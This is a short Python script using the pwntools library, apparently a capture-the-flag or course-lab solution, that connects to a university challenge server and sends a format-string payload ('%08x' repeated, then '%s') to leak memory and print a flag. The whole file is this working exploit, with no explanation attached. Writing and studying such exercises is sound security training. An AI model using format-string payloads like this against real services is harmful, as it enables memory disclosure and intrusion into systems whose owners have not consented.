from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25191

s = remote(SERVER, PORT, timeout=9999)

s.sendline('%08x.%08x.%08x.%08x.%08x.%08x.%s')
flag = s.recv(512).decode()
print(flag)
